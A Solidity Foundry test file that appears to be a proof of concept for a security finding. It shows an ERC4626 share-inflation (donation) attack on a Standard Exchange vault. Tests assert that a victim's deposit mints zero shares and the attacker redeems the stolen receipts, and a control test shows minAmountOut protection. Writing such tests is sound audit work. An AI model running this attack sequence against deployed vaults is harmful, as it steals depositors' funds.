// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IERC4626} from "@crane/contracts/interfaces/IERC4626.sol";
import {IStandardExchangeIn} from "@crane/contracts/interfaces/IStandardExchangeIn.sol";
import {TestBase_ERC4626StandardExchange} from "contracts/test/bases/TestBase_ERC4626StandardExchange.sol";
import {SimpleMintableERC20} from "contracts/test/stubs/SimpleMintableERC20.sol";
import {SimpleYieldERC4626} from "contracts/test/stubs/SimpleYieldERC4626.sol";

contract ReceiptBackedInflation_Test is TestBase_ERC4626StandardExchange {
    SimpleMintableERC20 internal underlying;
    SimpleYieldERC4626 internal protocolVault;
    address internal attacker = makeAddr("attacker");
    address internal victim = makeAddr("victim");

    function setUp() public override {
        TestBase_ERC4626StandardExchange.setUp();
        underlying = new SimpleMintableERC20("Underlying", "UND");
        protocolVault = new SimpleYieldERC4626(underlying);
        // Fund both parties with underlying and convert to receipts (protocol vault shares).
        underlying.mint(attacker, 10_001 ether);
        underlying.mint(victim, 20_000 ether);
        vm.startPrank(attacker);
        underlying.approve(address(protocolVault), type(uint256).max);
        protocolVault.deposit(10_001 ether, attacker);
        vm.stopPrank();
        vm.startPrank(victim);
        underlying.approve(address(protocolVault), type(uint256).max);
        protocolVault.deposit(20_000 ether, victim);
        vm.stopPrank();
    }

    function _r() internal view returns (IERC20) { return IERC20(address(protocolVault)); }

    /// Attacker (unprivileged) deploys the canonical SE vault, seeds 1 wei, donates D receipts.
    function _trap(uint256 D) internal returns (address se) {
        vm.startPrank(attacker);
        se = erc4626StandardExchangeDFPkg.deployVault(IERC4626(address(protocolVault)));
        _r().approve(se, type(uint256).max);
        uint256 s = IERC4626(se).deposit(1, attacker);
        _r().transfer(se, D);
        vm.stopPrank();
        assertEq(s, 1, "attacker got 1 share");
        assertEq(IERC20(se).totalSupply(), 1);
        assertEq(IERC4626(se).totalAssets(), D + 1, "backing inflated");
    }

    function test_inflation_victimGetsZeroShares_attackerStealsDeposit() public {
        uint256 D = 10_000 ether;
        uint256 X = 9_999 ether;
        uint256 atkBefore = _r().balanceOf(attacker);
        address se = _trap(D);

        // Honest victim deposits through the standard IERC4626 entrypoint.
        uint256 vBefore = _r().balanceOf(victim);
        vm.startPrank(victim);
        _r().approve(se, type(uint256).max);
        uint256 vShares = IERC4626(se).deposit(X, victim);
        vm.stopPrank();
        console2.log("victim deposited receipts", X);
        console2.log("victim shares minted", vShares);
        assertEq(vShares, 0, "victim got zero shares");
        assertEq(IERC20(se).balanceOf(victim), 0);
        assertEq(_r().balanceOf(victim), vBefore - X, "victim receipts taken");

        // Attacker redeems the single share.
        vm.prank(attacker);
        uint256 out = IERC4626(se).redeem(1, attacker, attacker);
        uint256 atkAfter = _r().balanceOf(attacker);
        console2.log("attacker redeemed receipts", out);
        console2.log("attacker profit (receipts)", atkAfter - atkBefore);
        console2.log("attacker profit (underlying)", protocolVault.convertToAssets(atkAfter - atkBefore));
        assertEq(atkAfter - atkBefore, X, "attacker profit == victim deposit");
        assertGt(atkAfter, atkBefore);
        // victim can never recover anything
        assertEq(IERC4626(se).maxRedeem(victim), 0);
    }

    /// Victim deposit larger than the donation: partial theft (floor to 1 share).
    function test_inflation_partialTheft_largerVictim() public {
        uint256 D = 10_000 ether;
        uint256 X = 19_999 ether; // < 2D+1 -> victim gets 1 share
        uint256 atkBefore = _r().balanceOf(attacker);
        address se = _trap(D);
        vm.startPrank(victim);
        _r().approve(se, type(uint256).max);
        uint256 vShares = IERC4626(se).deposit(X, victim);
        vm.stopPrank();
        assertEq(vShares, 1);
        vm.prank(attacker);
        IERC4626(se).redeem(1, attacker, attacker);
        vm.prank(victim);
        uint256 vOut = IERC4626(se).redeem(1, victim, victim);
        uint256 profit = _r().balanceOf(attacker) - atkBefore;
        console2.log("victim deposited", X);
        console2.log("victim redeemed", vOut);
        console2.log("victim loss", X - vOut);
        console2.log("attacker profit", profit);
        assertGt(profit, 0);
        assertEq(profit, X - vOut, "attacker gain == victim loss");
    }

    /// Control: exchangeIn route with nonzero minAmountOut protects the victim.
    function test_control_exchangeInWithMinOutReverts() public {
        address se = _trap(10_000 ether);
        vm.startPrank(victim);
        _r().approve(se, type(uint256).max);
        vm.expectRevert();IStandardExchangeIn(se).exchangeIn(_r(), 9_999 ether, IERC20(se), 1, victim, false, block.timestamp);
        vm.stopPrank();
    }

    /// exchangeIn with minAmountOut = 0: does the SE route also mint 0 silently?
    function test_exchangeIn_minOutZero() public {
        uint256 atkBefore = _r().balanceOf(attacker);
        address se = _trap(10_000 ether);
        vm.startPrank(victim);
        _r().approve(se, type(uint256).max);try IStandardExchangeIn(se).exchangeIn(_r(), 9_999 ether, IERC20(se), 0, victim, false, block.timestamp) returns (uint256 o, uint256) {
            console2.log("exchangeIn minOut=0 shares out", o);
        } catch {
            console2.log("exchangeIn minOut=0 reverted");
        }
        vm.stopPrank();
        vm.prank(attacker);
        IERC4626(se).redeem(1, attacker, attacker);
        console2.log("attacker delta after exchangeIn victim", int256(_r().balanceOf(attacker)) - int256(atkBefore));
    }
}
